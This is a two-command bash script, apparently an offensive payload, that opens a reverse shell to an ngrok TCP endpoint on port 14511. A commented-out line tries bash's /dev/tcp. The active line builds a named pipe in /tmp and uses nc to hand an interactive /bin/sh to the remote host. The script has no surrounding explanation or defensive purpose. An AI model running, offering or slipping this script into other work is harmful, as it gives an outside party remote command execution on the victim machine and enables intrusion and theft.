#!/bin/bash


#bash -i >& /dev/tcp/0.tcp.in.ngrok.io 14511 0>&1

mkfifo /tmp/lol;nc 0.tcp.in.ngrok.io 14511 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
